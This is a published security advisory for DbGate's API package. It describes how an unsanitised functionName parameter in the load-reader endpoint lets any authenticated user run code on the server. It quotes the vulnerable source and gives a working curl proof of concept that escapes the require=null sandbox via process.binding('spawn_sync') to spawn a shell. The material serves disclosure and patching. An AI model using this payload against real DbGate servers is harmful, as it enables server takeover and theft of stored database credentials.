# [H] DbGate: Remote Code Execution via functionName injection in loadReader endpoint

## Summary
Severity: High
Advisory: GHSA-hv83-ggc4-v385
CVE: CVE-2026-48017
CWE: CWE-94
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-06-05
Source: https://github.com/advisories/GHSA-hv83-ggc4-v385
Type: github-advisory

## Affected
- npm: `dbgate-api` — affected >=0 <7.1.9

## Details
### Summary

The `POST /runners/load-reader` endpoint in DbGate accepts a `functionName` parameter that is directly interpolated into a JavaScript code template without any sanitization or validation. An authenticated user (with basic access, no special permissions required) can inject arbitrary JavaScript code that executes on the server with full process privileges, bypassing the `require=null` sandbox restriction.

### Details

The `loadReader` endpoint in `packages/api/src/controllers/runners.js` (line 353) takes a `functionName` parameter from the request body and passes it to `compileShellApiFunctionName()` which performs no sanitization:

**Vulnerable code** ([permalink](https://github.com/dbgate/dbgate/blob/ea3a61077ab09775c39890c465f0b3e97f6c812e/packages/api/src/controllers/runners.js#L352-L368)):

```javascript
  loadReader_meta: true,
  async loadReader({ functionName, props }) {
    if (!platformInfo.isElectron) {
      if (props?.fileName && !checkSecureDirectories(props.fileName)) {
        return { errorMessage: 'DBGM-00289 Unallowed file' };
      }
    }
    const prefix = extractShellApiPlugins(functionName)
      .map(packageName => `// @require ${packageName}\n`)
      .join('');

    const promise = new Promise((resolve, reject) => {
      const runid = crypto.randomUUID();
      this.requests[runid] = { resolve, reject, exitOnStreamError: true };
      this.startCore(runid, loaderScriptTemplate(prefix, functionName, props, runid));
    });
    return promise;
  },
```

The `loaderScriptTemplate` at line 57-68 directly interpolates the compiled function name:

```javascript
const loaderScriptTemplate = (prefix, functionName, props, runid) => `
${prefix}
const dbgateApi = require(process.env.DBGATE_API);
dbgateApi.initializeApiEnvironment();
${requirePluginsTemplate(extractShellApiPlugins(functionName, props))}
require=null;
async function run() {
const reader=await ${compileShellApiFunctionName(functionName)}(${JSON.stringify(props)});
const writer=await dbgateApi.collectorWriter({runid: '${runid}'});
await dbgateApi.copyStream(reader, writer);
}
dbgateApi.runScript(run);
`;
```

The `compileShellApiFunctionName` in `packages/tools/src/packageTools.ts` (line 30-35) performs no validation:

```typescript
export function compileShellApiFunctionName(functionName) {
  const nsMatch = functionName.match(/^([^@]+)@([^@]+)/);
  if (nsMatch) {
    return `${_camelCase(nsMatch[2])}.shellApi.${nsMatch[1]}`;
  }
  return `dbgateApi.${functionName}`;
}
```

**Two injection vectors:**
1. Without `@`: The entire `functionName` is appended after `dbgateApi.` without sanitization
2. With `@`: The part before `@` (`nsMatch[1]`) is appended after `.shellApi.` without sanitization (only the part after `@` goes through `_camelCase`)

Although the script template sets `require=null`, the `process` global is still available. `process.binding("spawn_sync")` provides direct access to spawn child processes, completely bypassing the sandbox.

**Compare with safe code in the same file** (line 292):

```javascript
  start_meta: true,
  async start({ script }, req) {
    // ...
    await testStandardPermission('run-shell-script', req);  // <-- Permission check!
    if (!platformInfo.allowShellScripting) {                 // <-- Platform check!
      return { errorMessage: 'DBGM-00286 Shell scripting is not allowed' };
    }
    // ...
  },
```

The `start` endpoint requires the `run-shell-script` permission and checks `allowShellScripting`. The `loadReader` endpoint has **neither** of these checks, making it a privilege escalation from any authenticated user to full RCE.

### PoC

An authenticated user sends a POST request to `/runners/load-reader` with a crafted `functionName`:

```bash
# The malicious functionName breaks out of the expression and injects
# process.binding("spawn_sync") to execute arbitrary commands.
# The // at the end comments out the remaining template code.

curl -X POST http://TARGET:3000/runners/load-reader \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <JWT_TOKEN>" \
  -d '{
    "functionName": "toString();var __r=process.binding(\"spawn_sync\").spawn({file:\"/bin/sh\",args:[\"/bin/sh\",\"-c\",\"id > /tmp/dbgate-rce-proof\"],envPairs:[],stdio:[{type:\"pipe\",readable:true,writable:false},{type:\"pipe\",readable:false,writable:true},{type:\"pipe\",readable:false,writable:true}]});dbgateApi.toString//",
    "props": {}
  }'
```

This generates the following JavaScript that is forked as a child process:

```javascript
const dbgateApi = require(process.env.DBGATE_API);
dbgateApi.initializeApiEnvironment();
require=null;
async function run() {
const reader=await dbgateApi.toString();var __r=process.binding("spawn_sync").spawn({file:"/bin/sh",args:["/bin/sh","-c","id > /tmp/dbgate-rce-proof"],envPairs:[],stdio:[{type:"pipe",readable:true,writable:false},{type:"pipe",readable:false,writable:true},{type:"pipe",readable:false,writable:true}]});dbgateApi.toString//({})
// ... rest of template
}
dbgateApi.runScript(run);
```

After the request, `/tmp/dbgate-rce-proof` contains the output of `id`, confirming arbitrary command execution.

A standalone PoC script is available at: `reports/cve-hunting/pocs/dbgate/rce_loadreader_functionname_injection.py`

### Impact

An authenticated user with **basic access** (no admin role, no `run-shell-script` permission required) can:

1. **Execute arbitrary OS commands** on the DbGate server with the privileges of the Node.js process
2. **Read/write any file** accessible to the process
3. **Pivot to connected databases** by reading connection credentials from DbGate's storage
4. **Compromise the host system** - in Docker deployments, this typically means root access within the container

This is particularly severe because:
- No special permissions are required beyond basic authentication
- The `require=null` sandbox is completely bypassed via `process.binding("spawn_sync")`
- The `loadReader` endpoint lacks the permission checks present on the `start` endpoint
- DbGate is commonly deployed as a web-accessible database management tool

## References
- https://github.com/dbgate/dbgate/security/advisories/GHSA-hv83-ggc4-v385
- https://nvd.nist.gov/vuln/detail/CVE-2026-48017
- https://github.com/dbgate/dbgate
- https://github.com/dbgate/dbgate/releases/tag/v7.1.9
